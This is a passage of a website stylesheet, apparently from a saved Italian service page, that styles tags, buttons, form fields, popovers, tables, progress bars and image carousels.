    padding-left: 38px;
    position: relative;
}

.tag.tag-ico:before {
    background-position: center;
    background-repeat: no-repeat;
    background-size: 12px;
    display: block;
    height: 12px;
    width: 12px;
    top: 8px;
    left: 15px;
    position: absolute;
    content: " ";
}

.tag-ico-filter:before {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-filtro.png*/ url();
}

.tag-element-heavenly.tag-ico-filter:before {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue/ico-filtro.png*/ url();
}

.tag-remove {
    display: block;
    width: 40px;
    height: 100%;
    content: "";
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-annulla.png*/ url();
    background-repeat: no-repeat;
    background-position: center;
    background-size: 12px;
    position: absolute;
    right: 0px;
    top: 0px;
    text-indent: -9999px;
    -webkit-border-radius: 0px 30px 30px 0px;
    -moz-border-radius: 0px 30px 30px 0px;
    border-radius: 0px 30px 30px 0px;
    border-left: 1px solid #fff;
}

.tag-element-heavenly .tag-remove {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue/ico-annulla.png*/ url();
}

.tag:active {
    background-color: #f3f3f3;
}

.tag-element-drag {
    cursor: move;
}

.tag-remove:hover {
    cursor: pointer;
    background-color: #e0dddd;
}

.tag-element-heavenly .tag-remove:hover {
    background-color: #c6d7f2;
}

.tag-group .input-group-btn {
    vertical-align: bottom;
    height: 34px;
}

.tag-group .input-group-btn .btn {
    margin-bottom: 0;
}

.tag-container {
    padding-top: 10px;
    padding-bottom: 10px;
}

.tag-group .tag-container {}

.btn-cta {
    background-color: #eedc00;
    background-position: center;
    background-repeat: no-repeat;
    -webkit-border-radius: 30px !important;
    -moz-border-radius: 30px !important;
    border-radius: 30px !important;
    line-height: 44px;
    padding: 2px 24px;
    text-indent: -9999px;
    border: 1px solid #eedc00;
    outline: none !important;
}

.btn-cta-white {
    background-color: #fff;
}

.btn-cta-small {
    line-height: 30px;
    padding: 3px 18px;
    margin-bottom: 0;
}

.btn-cta-primary {
    background-color: #eedc00;
}

.btn-cta-primary:hover {
    background-color: #ffec00;
}

.btn-cta-secondary {
    background-color: transparent;
    border: 1px solid #eedc00;
}

.btn-cta-secondary:hover {
    background-color: #eedc00;
    border: 1px solid #eedc00;
}

.btn-cta-remove,
.btn-cta-remove:active,
.btn-cta-remove:hover {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-element-remove.png*/ url();
    border: none;
    background-color: transparent !important;
}

.btn-cta-support-scrivici,
.btn-cta-support-scrivici:active {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-scrivici.png*/ url();
}

.btn-cta-support-chiamaci,
.btn-cta-support-chiamaci:active {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-chiamaci.png*/ url();
}

.btn-cta-support-vieniatrovarci,
.btn-cta-support-vieniatrovarci:active {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-vieni-in-poste-cerca-up.png*/ url();
}

.btn-cta-cerca,
.btn-cta-cerca:active {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-cerca.png*/ url();
}

.btn-cta-elimina,
.btn-cta-elimina:active {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-cestino.png*/ url();
}

.btn-cta-upload,
.btn-cta-upload:active {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-upload.png*/ url();
}

.btn-cta-filtra,
.btn-cta-filtra:active {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-filtro.png*/ url();
}

.btn[disabled],
.btn[readonly],
.btn-card[disabled],
.btn-card[readonly],
.btn-card.disabled,
.btn-card.readonly {
    background-color: #f6f6f6 !important;
    border-color: #f6f6f6 !important;
    color: #d0d0d0 !important;
    text-decoration: none;
    cursor: not-allowed;
}

.btn-primary.disabled:hover,
.btn-primary[disabled]:hover,
fieldset[disabled] .btn-primary:hover,
.btn-primary.disabled:focus,
.btn-primary[disabled]:focus,
fieldset[disabled] .btn-primary:focus,
.btn-primary.disabled.focus,
.btn-primary.focus[disabled],
fieldset[disabled] .btn-primary.focus,
.btn-secondary.disabled:hover,
.btn-secondary[disabled]:hover,
fieldset[disabled] .btn-secondary:hover,
.btn-secondary.disabled:focus,
.btn-secondary[disabled]:focus,
fieldset[disabled] .btn-secondary:focus,
.btn-secondary.disabled.focus,
.btn-secondary.focus[disabled],
fieldset[disabled] .btn-secondary.focus,
.btn-default.disabled:hover,
.btn-default[disabled]:hover,
fieldset[disabled] .btn-default:hover,
.btn-default.disabled:focus,
.btn-default[disabled]:focus,
fieldset[disabled] .btn-default:focus,
.btn-default.disabled.focus,
.btn-default.focus[disabled],
fieldset[disabled] .btn-default.focus {
    background-color: #f6f6f6;
    border-color: #f6f6f6;
    color: #d0d0d0;
}

.btn-radio .btn-default {
    color: #0047bb;
    border: 1px solid #d0d0d0;
}

.btn-radio .btn-default.active {
    background-color: #0047bb !important;
    color: #fff !important;
    border-color: #0047bb !important;
}

.btn-group-expand.btn-radio {
    width: 100%;
    display: table;
}

.btn-group-expand.btn-radio .btn {
    width: 100%;
    display: table-cell;
    /* truncate overflow text */
    overflow: hidden;
    text-overflow: ellipsis;
}

.btn-group-expand-2.btn-radio .btn {
    width: 50%;
}

.btn-group-expand-3.btn-radio .btn {
    width: 33.333%;
}

.btn-group-expand-4.btn-radio .btn {
    width: 25%;
}

.btn-group-expand-5.btn-radio .btn {
    width: 20%;
}

.btn-group-expand-6.btn-radio .btn {
    width: 16.6%;
}

.area-evidence-active .btn[disabled],
.area-evidence-active .btn[readonly],
.area-evidence-active .btn-card[disabled],
.area-evidence-active .btn-card[readonly],
.area-evidence-active .btn-card.disabled,
.area-evidence-active .btn-card.readonly {
    border-color: #ececec !important;
    background-color: #ececec !important;
    ;
}


/* form */

.form-control {
    color: #222427;
    -webkit-border-radius: 0px !important;
    -moz-border-radius: 0px !important;
    border-radius: 0px !important;
    box-shadow: none;
    background-color: transparent;
}

input.form-control,
select.form-control,
span.form-control {
    border-color: #d0d0d0;
    border-width: 0 0 1px;
    border-style: solid;
}

.form-control:focus {
    box-shadow: none;
    border-color: #0047bb;
}

.form-group,
.form-inline .form-group {
    margin-bottom: 25px;
}

.form-inline .btn {
    margin-top: -10px;
}

.form-group-lg .form-control {
    font-size: 18px;
    font-style: italic;
    padding: 10px 6px;
}

.form-pincode .form-group-lg {
    display: inline-block;
    margin-right: 3px;
    margin-bottom: 10px
}

.form-pincode .form-group-lg .form-control {
    width: 28px;
    font-size: 24px;
    text-align: center;
    font-style: normal;
}

.form-group-lg textarea.form-control {
    resize: vertical;
}

.input-group-addon,
.has-error .input-group-addon,
.has-success .input-group-addon,
.has-warning .input-group-addon {
    background-color: transparent;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
    border-width: 0 0 1px;
    border-style: solid;
}

.has-error .input-group-addon,
.has-success .input-group-addon,
.has-warning .input-group-addon {
    border-color: transparent;
}

.input-group-addon {
    border-color: #d0d0d0;
    font-size: 18px;
}

.img-ico,
.input-group-addon img {
    max-width: 24px;
    max-height: 24px;
}

.input-group-addon-decimals {
    border-bottom: none !important;
    border-left: 16px solid #fff !important;
    position: relative;
    padding: 0;
}

.input-group-addon-decimals:before {
    content: ",";
    position: absolute;
    left: -14px;
    bottom: -1px;
    border-bottom: 1px solid #fff;
    width: 16px;
}

.input-group-addon-decimals input.form-control {
    width: 40px;
    height: 46px;
    padding: 0;
    text-align: center;
}

.input-group-addon:hover {
    cursor: pointer;
}

.input-group-addon-decimals:hover {
    cursor: auto;
}

.input-group-addon-disabled {
    border-style: dashed;
    color: #d0d0d0;
}

.input-group-addon-disabled:hover {
    cursor: not-allowed;
}

/* fix line-height su campi search seguiti da input-group-btn */
.input-group .input-search{
   height: 100%;
   line-height: 1.7;
   min-height: 50px;
}

/*
.input-group .form-control:last-child,
.input-group-addon:last-child,
.input-group-btn:last-child > .btn,
.input-group-btn:last-child > .btn-group > .btn,
.input-group-btn:last-child > .dropdown-toggle,
.input-group-btn:first-child > .btn:not(:first-child),
.input-group-btn:first-child > .btn-group:not(:first-child) > .btn {
    -webkit-border-radius: 30px;
    -moz-border-radius: 30px;
    border-radius: 30px;
}
*/

label {
    font-size: 15px;
    font-weight: 500;
    text-transform: uppercase;
    /* padding-left: 6px; */
    padding-left: 0px;
    margin-bottom: 0;
    margin-top: 5px;
    color: #787878;
}

.form-horizontal .form-group-lg .control-label {
    font-size: 15px;
    padding-top: 9px;
    text-align: left;
}

.form-horizontal .form-group-lg .form-control-static {
    padding: 10px 6px;
}

.radio label,
.checkbox label {
    font-size: 18px;
    text-transform: inherit;
    font-weight: normal;
    padding-left: 10px;
}

label.radio-inline,
label.checkbox-inline {
    margin-top: 0;
}

.disabled label.control-label,
.readonly label.control-label {
    color: #d0d0d0;
}

.has-success .form-control,
.has-success .form-control:focus,
.has-warning .form-control,
.has-warning .form-control:focus,
.has-error .form-control,
.has-error .form-control:focus {
    box-shadow: none;
}

.has-success .form-control,
.has-success .form-control:focus,
.has-success .input-group-addon {
    border-color: #26b158 !important;
}

.has-warning .form-control,
.has-warning .form-control:focus,
.has-warning .input-group-addon {
    border-color: #ffb906 !important;
}

.has-error .form-control,
.has-error .form-control:focus,
.has-error .input-group-addon {
    border-color: #ff3636 !important;
}

.has-success .control-span,
.has-success .help-block,
.has-success .control-label,
.has-success .radio,
.has-success .checkbox,
.has-success .radio-inline,
.has-success .checkbox-inline,
.has-success.radio label,
.has-success.checkbox label,
.has-success.radio-inline label,
.has-success.checkbox-inline label,
.has-success .input-group-addon {
    color: #26b158 !important;
}

.has-warning .control-span,
.has-warning .help-block,
.has-warning .control-label,
.has-warning .radio,
.has-warning .checkbox,
.has-warning .radio-inline,
.has-warning .checkbox-inline,
.has-warning.radio label,
.has-warning.checkbox label,
.has-warning.radio-inline label,
.has-warning.checkbox-inline label,
.has-warning .input-group-addon {
    color: #ffb906 !important;
}

.has-error .control-span,
.has-error .help-block,
.has-error .control-label,
.has-error .radio,
.has-error .checkbox,
.has-error .radio-inline,
.has-error .checkbox-inline,
.has-error.radio label,
.has-error.checkbox label,
.has-error.radio-inline label,
.has-error.checkbox-inline label,
.has-error .input-group-addon {
    color: #ff3636 !important;
}

.has-success .input-group-addon-decimals,
.has-warning .input-group-addon-decimals,
.has-error .input-group-addon-decimals {
    border-color: #fff !important;
}

.form-control[disabled],
.form-control[readonly],
fieldset[disabled] .form-control {
    background-color: transparent;
    color: #d0d0d0;
    border-style: dashed;
    border-color: #d0d0d0 !important;
}

.form-control[disabled]:hover,
.form-control[readonly]:hover,
fieldset[disabled] .form-control:hover {
    cursor: not-allowed;
}

.has-feedback .form-control {
    padding-right: 42.5px;
}

.control-span {
    font-weight: bold;
}


/*
.box-summary label {
    padding-left: 0;
}
*/

.box-summary .form-control-static {
    font-style: italic;
}

.box-summary .form-group,
.box-summary .form-inline .form-group {
    margin-bottom: 15px;
}

.area-evidence {
    background-color: #fff;
    transition: background-color 0.5s ease;
}

.area-evidence-active {
    background-color: #fbfbfb;
    border: 1px solid #ececec;
    border-bottom: none;
}

.box-evidence {
    border: 1px solid #ececec;
    padding: 30px;
}

.box-survey {
    margin-top: 20px;
}

.spaced-ol li {
    margin-bottom: 40px;
}

.spaced-ol .box-evidence {
    border: none;
    padding: 10px;
    background-color: #ececec;
}


/* popover */

.popover {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    padding: 20px;
    z-index: 1038;
}

.popover-title {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    padding: 0 0 6px 0;
    background-color: transparent;
    text-transform: uppercase;
    color: #787878;
}

.popover-content {
    padding: 15px 0 5px;
}

.popover.right.popover-gap {
    margin-left: 67px;
}

.popover-error .popover-content,
.popover-warning .popover-content,
.popover-success .popover-content {
    padding: 0;
}

.popover-error {
    border-color: #ff3636;
}

.popover-warning {
    border-color: #ffb906;
}

.popover-success {
    border-color: #26b158;
}

.popover-error.right > .arrow {
    border-right-color: #ff3636;
}

.popover-warning.right > .arrow {
    border-right-color: #ffb906;
}

.popover-success.right > .arrow {
    border-right-color: #26b158;
}

.popover-error.bottom > .arrow {
    border-bottom-color: #ff3636;
}

.popover-warning.bottom > .arrow {
    border-bottom-color: #ffb906;
}

.popover-success.bottom > .arrow {
    border-bottom-color: #26b158;
}

.popover ul.popover-menu {
    font-size: 15px;
    padding: 0px;
    margin: 0px;
}

.popover ul.popover-menu li {
    line-height: normal;
    list-style: none;
    text-align: left;
}

.popover ul.popover-menu li a {
    display: block;
    padding: 6px 20px;
    margin: auto -20px;
    color: #333;
    white-space: nowrap;
    font-weight: normal;
}

.popover ul.popover-menu li a:hover {
    background-color: #f5f5f5;
    color: #0047bb;
}

.popover ul.popover-menu li a img {
    width: 24px;
}

.popover ul.popover-menu {
    min-width: 230px;
}

.popover ul.popover-menu-social {
    min-width: 230px;
}

label img.popover-info {
    width: 15px;
    margin-left: 4px;
    vertical-align: top;
    cursor: pointer;
}

/* Social Bar */
ul.social-bar{
   display: inline-block;
   padding: 10px 0;
   margin: 0;
   list-style: none;
   line-height: 24px;
}
ul.social-bar li{
   display: inline-block;
   padding: 0px 6px;
}

.social-bar-container-left ul.social-bar{
   float: left;
}

.social-bar-container-right ul.social-bar{
   float: right;
}

.social-bar-container-left ul.social-bar li:first-child{
   padding-left: 0;
}

.social-bar-container-right ul.social-bar li:last-child{
   padding-right: 0;
}

/* Modulo Upload */

.docs-preview {
   border-radius: 5px;
   border: 1px solid #ececec;
   background-color: #fff;
   background-image: linear-gradient(45deg, #f4f4f4 25%, transparent 25%, transparent 75%, #f4f4f4 75%), linear-gradient(45deg, #f4f4f4 25%, transparent 25%, transparent 75%, #f4f4f4 75%);
   background-size: 20px 20px;
   background-position: 0 0, 50px 50px;
   min-height: 265px;
   text-align: center;
   margin-bottom: 15px;
}

img.docs-preview-uploaded {
   position: absolute;
   bottom: -12px;
   right: -12px;
   width: 45px;
}

.file-remove {
    display: inline-block;
    width: 12px;
    height: 100%;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-annulla.png*/ url();
    background-repeat: no-repeat;
    background-position: center;
    background-size: 12px;
    text-indent: -9999px;
}
.file-remove:hover{
   background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-blue/ico-annulla.png*/ url();
}
/* Box avvisi e errori */

.box-messages {
    margin-bottom: 40px;
}

.box-messages {
    background-color: #fff;
    border-width: 1px 1px 1px 10px;
    border-style: solid;
    border-color: transparent;
    padding: 25px;
}

.box-messages ul {
    padding: 0;
    list-style-position: inside;
}

.box-messages .area-heading {
    margin: 0;
}

.box-messages .box-body {
    margin-top: 20px;
}

.box-info {
    border-color: #0047bb;
}

.box-warning {
    border-color: #ffb906;
}

.box-error,
.box-danger {
    border-color: #ff3636;
}

.box-success {
    border-color: #26b158;
}


/* Allineamenti verticali */

.table-like {
    display: table;
    width: 100%;
}

.table-like .tablerow-like {
    display: table-row;
}

.table-like .tablecell-like {
    display: table-cell;
    vertical-align: middle;
}

.vam {
    vertical-align: middle !important;
}

.vat {
    vertical-align: top !important;
}


/* Allineamenti verticali custom */

.table-like-note,
.table-like-default {
    margin-top: 25px;
}

.table-like-note .tablerow-like:first-child .tablecell-like {
    height: 46px;
}

.form-group-lg .table-like-note .tablecell-like {
    height: 46px;
}

.form-group-lg .table-like-default .tablecell-like {
    height: 46px;
}

.table-like-collapsed-obj .tablecell-like {
    height: 40px;
}


/* tabelle */

.table-bordered > thead > tr > th {
    height: 50px;
}

.table-bordered > tbody > tr > td {
    height: 40px;
    vertical-align: middle;
}

.table-bordered > thead > tr > th,
.table-bordered > thead > tr > td,
.table-bordered > tbody > tr > th {
    border-bottom: 1px;
    background-color: #ececec;
}

.table-whitehead,
.table-whitehead > thead > tr > th,
.table-whitehead > thead > tr > td,
.table-whitehead > tbody > tr > th {
    border: 1px solid #ddd;
}

.table-whitehead > thead > tr > th,
.table-whitehead > tbody > tr > td {
    border-right: 1px solid #ddd;
    vertical-align: bottom;
}

.table-basic {
    border: 1px solid #ddd;
}

.table-basic > thead > tr > th {
    border: 2px solid #fff !important;
    border-bottom: 1px solid #ddd !important;
}

.table-basic > tbody > tr > td,
.table-basic > tbody > tr > th {
    border-right: 1px solid #ddd;
    vertical-align: bottom;
}

.table-basic > tbody > tr > td:last-child,
.table-basic > tbody > tr > th:last-child {
    border-right: none
}

.table-responsive-noborder {
    border: none;
}


/* Autocompletation - Form Typeahead */

.twitter-typeahead {
    width: 100%;
}

.twitter-typeahead .tt-query,
.twitter-typeahead .tt-hint {
    margin-bottom: 0;
}

.tt-menu {
    min-width: 160px;
    margin-top: 2px;
    padding: 5px 0;
    background-color: #fff;
    border: 1px solid #ccc;
    border: 1px solid rgba(0, 0, 0, 0.2);
    *border-right-width: 2px;
    *border-bottom-width: 2px;
    -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.176);
    -moz-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.176);
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.176);
    -webkit-background-clip: padding-box;
    -moz-background-clip: padding;
    background-clip: padding-box;
    width: 100%;
}

.tt-suggestion {
    display: block;
    padding: 3px 20px;
}

.tt-suggestion:hover {
    cursor: pointer;
    background-color: #eee;
}

.tt-suggestion.tt-cursor {
    color: #535353;
    background-color: #eee;
}

.tt-suggestion.tt-cursor a {
    color: #fff;
}

.tt-suggestion p {
    margin: 0;
}

.tt-suggestion .tt-highlight {
    color: #0047bb;
    font-weight: bold;
}

.scrollable-dropdown-menu .tt-menu {
    max-height: 150px !important;
    overflow-y: auto;
}


/* Progress Bar */

.progress {
    -webkit-border-radius: 20px;
    -moz-border-radius: 20px;
    -ms-border-radius: 20px;
    /*border-radius: 20px;*/
    border-radius: 0px;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    /*height: 30px;*/
    height: 5px;
}

.progress-bar {
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    background-color: #0047bb;
    color: transparent;
    font-weight: 400;
    /*line-height: 30px;*/
    font-size: 16px;
    padding: 0 10px;
    text-align: right;
    -webkit-transition: width 0.1s linear;
    transition: width 0.1s linear;
}

.progress-bar span {
    display: none;
}

.progress-bar-default {
    background-color: #d9534f !important
}

.progress-bar-danger {
    background-color: #e35955 !important
}

.progress-bar-warning {
    background-color: #f0ad4e !important;
}

.progress-bar-complete {
    background-color: #5cb85c !important;
}

.progress-bar-success {
    background-color: #389234 !important;
}

.content-graphic-stages .progress {
    height: 10px;
}


/* placeholding */

.form-control::-webkit-input-placeholder {
    color: #787878;
    font-style: italic;
}

.form-control:-moz-placeholder {
    color: #787878;
    font-style: italic;
}

.form-control::-moz-placeholder {
    color: #787878;
    font-style: italic;
}

.form-control:-ms-input-placeholder {
    color: #787878;
    font-style: italic;
}

.form-control[disabled]::-webkit-input-placeholder {
    color: #d0d0d0;
}

.form-control[disabled]:-moz-placeholder {
    color: #d0d0d0;
}

.form-control[disabled]::-moz-placeholder,
.form-control[readonly]::-moz-placeholder,
.disabled .form-control::-moz-placeholder {
    color: #d0d0d0;
}

.form-control[disabled]:-ms-input-placeholder,
.disabled .form-control:-ms-input-placeholder {
    color: #d0d0d0;
}

.form-control[readonly]::-webkit-input-placeholder,
.disabled .form-control::-webkit-input-placeholder {
    color: #d0d0d0;
}

.form-control[readonly]:-moz-placeholder,
.disabled .form-control:-moz-placeholder {
    color: #d0d0d0;
}


/*
.form-control[readonly]::-moz-placeholder {
    color: #d0d0d0;
}
*/

.form-control[readonly]:-ms-input-placeholder,
.disabled .form-control:-ms-input-placeholder {
    color: #d0d0d0;
}

.onlayer-light-grey {
    background-color: #f6f6f6;
}

.onlayer-grey {
    background-color: #ececec;
}

.onlayer-white {
    background-color: #fff;
}

.onlayer-blue {
    background-color: #d8eef5;
}

.box-evidence.onlayer-grey .border-xs-bottom,
.box-evidence.onlayer-grey .border-sm-bottom,
.box-evidence.onlayer-blue .border-xs-bottom,
.box-evidence.onlayer-blue .border-sm-bottom {
    border-color: #ccc !important;
}

.box-evidence.onlayer-grey hr,
.box-evidence.onlayer-blue hr {
    display: block;
    margin: 25px 0;
    border-width: 1px;
    border-color: #ccc;
}

.box-evidence.onlayer-grey input.form-control,
.box-evidence.onlayer-grey select.form-control,
.box-evidence.onlayer-grey span.form-control,
.box-evidence.onlayer-grey .form-control,
.box-evidence.onlayer-grey .input-group-addon,
.box-evidence.onlayer-grey .has-error .input-group-addon,
.box-evidence.onlayer-grey .has-success .input-group-addon,
.box-evidence.onlayer-grey .has-warning .input-group-addon,
.box-evidence.onlayer-blue input.form-control,
.box-evidence.onlayer-blue select.form-control,
.box-evidence.onlayer-blue span.form-control,
.box-evidence.onlayer-blue .form-control,
.box-evidence.onlayer-blue .input-group-addon,
.box-evidence.onlayer-blue .has-error .input-group-addon,
.box-evidence.onlayer-blue .has-success .input-group-addon,
.box-evidence.onlayer-blue .has-warning .input-group-addon {
    background-color: #fff;
    border-color: #fff;
    border-width: 1px;
}

.main-pills .main-pills-wrap .box-evidence.onlayer-grey,
.main-pills .main-pills-wrap .box-evidence.onlayer-blue {
    margin: 0 -40px 20px;
    border-left: none;
    border-right: none;
    padding: 20px 40px;
}

.box-evidence.onlayer-grey + .box-evidence.onlayer-grey,
.box-evidence.onlayer-grey + .box-evidence.onlayer-blue {
    border-top: none;
}

.box-evidence.onlayer-grey .input-group-addon-decimals,
.box-evidence.onlayer-blue .input-group-addon-decimals {
    border-top: none;
    border-left: 16px solid #ececec !important;
}

.box-evidence.onlayer-grey .input-group-addon-decimals:before,
.box-evidence.onlayer-blue .input-group-addon-decimals:before {
    left: -16px;
    border-bottom: 1px solid #ececec;
}

.box-evidence.onlayer-grey .has-error .input-group-addon:first-child,
.box-evidence.onlayer-grey .has-success .input-group-addon:first-child,
.box-evidence.onlayer-grey .has-warning .input-group-addon:first-child,
.box-evidence.onlayer-blue .has-error .input-group-addon:first-child,
.box-evidence.onlayer-blue .has-success .input-group-addon:first-child,
.box-evidence.onlayer-blue .has-warning .input-group-addon:first-child {
    border-right: none;
}


/* ################# */

.onlayer-grey .box-sheet {
    margin-top: 20px;
    margin-bottom: -20px;
}

.onlayer-grey .box-sheet::before {
    top: 20px;
    right: 15px;
}

.onlayer-grey.table-striped > tbody > tr:nth-of-type(3n + 1) {
    background-color: #ececec;
}


/***************************/

/******* Hero *******/

/***************************/

.content-hero .item {
    background-position: top center;
    background-repeat: no-repeat;
    -webkit-transform-style: preserve-3d;
    -moz-transform-style: preserve-3d;
    transform-style: preserve-3d;
}

.content-hero .item {
    text-align: center;
}

.content-hero .item img {
    margin: 0 auto;
}

.carousel-text {
    margin-top: 0;
    display: table;
    width: 100%;
}

.carousel-text-light,
.carousel-text-light .carousel-text-heading {
    color: #fff;
}

.carousel-text-dark,
.carousel-text-dark .carousel-text-heading {
    color: #222427;
}

.carousel-text-right {
    text-align: right;
}

.carousel-text-left {
    text-align: left;
}

.carousel-text-center {
    text-align: center;
}

.carousel-control {
    display: none;
    background: #1b1b1b none repeat scroll 0 0;
    border: 0 none;
    border-radius: 50%;
    color: #fff;
    height: 60px;
    line-height: 60px;
    margin-top: -30px;
    opacity: 0.5;
    position: absolute;
    text-shadow: none;
    top: 50%;
    transition: all 0.2s ease-in-out 0s;
    width: 60px;
    z-index: 5;
}

.left.carousel-control {
    left: 5px;
}

.right.carousel-control {
    right: 5px;
}

.carousel-control .glyphicon-chevron-left,
.carousel-control .glyphicon-chevron-right,
.carousel-control .icon-prev,
.carousel-control .icon-next {
    margin-top: -15px;
}

.carousel-control .glyphicon-chevron-left,
.carousel-control .icon-prev {
    margin-left: -15px;
}

.carousel-control .glyphicon-chevron-right,
.carousel-control .icon-next {
    margin-right: -15px;
}

.carousel:hover .carousel-control {
    display: block;
}

.banner-advice {
    position: absolute;
    right: 0;
    bottom: 5px;
    width: 100%;
    z-index: 9;
    background-color: transparent;
    color: #000;
    font-size: 13px;
    opacity: 0.75;
    text-align: center
}

.banner-advice p {
    padding: 4px;
    margin: 0;
}

.banner-advice-dark {
    color: #fff;
}

.banner-advice-light {
    color: #000;
}


/* all carousel */

.carousel .item {
    width: 100%;
    background-position: center center;
    background-repeat: no-repeat;
    background-size: cover;
    color: #fff;
    font-size: 36px;
    background-color: #000;
}

.carousel .carousel-cta {
    margin-top: 30px;
}

.carousel .carousel-text .carousel-text-wrap .carousel-text-heading {
    font-size: 36px;
}

.carousel .carousel-text .carousel-text-wrap p {
    font-size: 20px;
}

.carousel .carousel-text .carousel-text-wrap {
    display: table-cell;
    width: 100%;
}

.carousel .carousel-text .carousel-text-wrap .btn-primary:hover,
.carousel .carousel-text .carousel-text-wrap .btn-primary:focus,
.carousel .carousel-text .carousel-text-wrap .btn-primary.active,
.carousel .carousel-text .carousel-text-wrap .btn-primary:active,
.carousel .carousel-text .carousel-text-wrap .btn-primary.focus {
    color: #333 !important;
}

.carousel-overlay {
    height: 100%;
}


/* carousel b */

.carousel-b .item {
    height: 420px;
}

.carousel-b .carousel-text .carousel-text-wrap .carousel-text-heading {
    padding-bottom: 10px;
}

.carousel-b .carousel-text .carousel-text-wrap {
    vertical-align: middle;
    height: 420px;
}


/* carousel l */

.carousel-l1 .item,
.carousel-l2 .item,
.carousel-l3 .item {
    height: 600px;
    background-position: center;
}

.carousel-l1 .carousel-text .carousel-text-wrap,
.carousel-l2 .carousel-text .carousel-text-wrap,
.carousel-l3 .carousel-text .carousel-text-wrap {
    height: 600px;
    padding: 50px 0 35px;
}

.carousel-l1 .carousel-text .carousel-text-wrap {
    vertical-align: bottom;
}

.carousel-l2 .carousel-text .carousel-text-wrap,
.carousel-l3 .carousel-text .carousel-text-wrap {
    vertical-align: middle;
}

.carousel-l1 .carousel-text .carousel-text-wrap .carousel-text-heading,
.carousel-l2 .carousel-text .carousel-text-wrap .carousel-text-heading,
.carousel-l3 .carousel-text .carousel-text-wrap .carousel-text-heading {
    padding-bottom: 10px;
}


/* carousel a1 */

.carousel-a1 .item {
    height: 450px;
}

.carousel-a1 .item .btn {
    line-height: 40px;
}

.carousel-a1 .item video {
    width: 100%;
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    left: 0;
}

.carousel-a1 .item .video-youtube {
    width: 100%;
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    left: 0;
}

.carousel-a1 .carousel-indicators {
    bottom: 40px;
}

.carousel-a1 .carousel-text .carousel-text-wrap {
    vertical-align: bottom;
    height: 380px;
}

.carousel-a1 .carousel-text .carousel-text-wrap .carousel-text-heading {
    font-size: 60px;
}

.carousel-a1 .carousel-text .carousel-text-wrap p {
    font-size: 24px;
}

.carousel-a1 .carousel-text.carousel-text-small .carousel-text-wrap .carousel-text-heading {
    font-size: 40px;
    line-height: 1.0;
}

.carousel-a1 .carousel-text.carousel-text-small .carousel-text-wrap p {
    font-size: 18px;
}

.carousel-a1 .banner-advice {
    bottom: -30px;
}

.carousel-a1 .carousel-overlay {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/row-033.png*/ url();
    background-position: bottom;
    background-repeat: repeat-x;
    height: 100%;
}

/* carousel tutorial*/

.carousel-tutorial .item {
    background-color: #fff;
    color: #222427;
}

.carousel-tutorial .carousel-control {
    display: block;
}

.carousel-tutorial .carousel-indicators {
    bottom: -40px;
}

.carousel-tutorial .carousel-indicators li {
    background-color: #979797;
    border-color: #979797;
}

.carousel-tutorial .carousel-indicators li.active {
    width: 42px;
    background-color: #fff;
    border-color: #fff;
}

.carousel-tutorial .carousel-img-wrap {
    padding: 0px 15px 25px;
}

.carousel-tutorial .carousel-description-wrap {
    background-color: #eedc00;
    color: #222427;
    font-size: 1rem;
    padding: 20px;
}

.carousel-tutorial .carousel-description {
    height: 65px;
    overflow-y: auto;
    padding-right: 25px;
}

.carousel-tutorial .carousel-text-wrap {
    color: #222427;
    padding: 15px;
}

.carousel-tutorial .carousel-text-heading {
    font-size: 36px;
    font-weight: 500;
    margin: 20px 0 15px;
    line-height: initial;
    color: #222427;
}


.modal-stretch .carousel-tutorial .carousel-control {
    opacity: 1;
    background-color: #fff;
    background-image: none;
    color: #222427;
}

.modal-stretch .carousel-tutorial .left.carousel-control {
    left: -90px;
}

.modal-stretch .carousel-tutorial .right.carousel-control {
    right: -90px;
}


/* carousel video youtube*/

.cover {
    position: absolute;
    top: 0;
    left: 0;
    z-index: 2;
    width: 100%;
    height: 100%;
}

.cover .hi {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

.cover .hi span {
    cursor: pointer;
    text-decoration: underline;
}

.tv {
    position: absolute;
    top: 0;
    left: 0;
    z-index: 1;
    width: 100%;
    height: 100%;
    overflow: hidden;
}

.tv .screen {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 1;
    margin: auto;
    opacity: 0;
    transition: opacity .5s;
    width: 100%;
}

.tv .screen.active {
    opacity: 1;
}


/* carousel a2 */

.carousel-a2 .item {
    height: 400px;
    background-position: center right;
}

.carousel-a2 .carousel-text .carousel-text-wrap {
    vertical-align: middle;
    height: 400px;
}

.carousel-a2 .carousel-text .carousel-text-wrap .carousel-text-heading {
    padding-bottom: 10px;
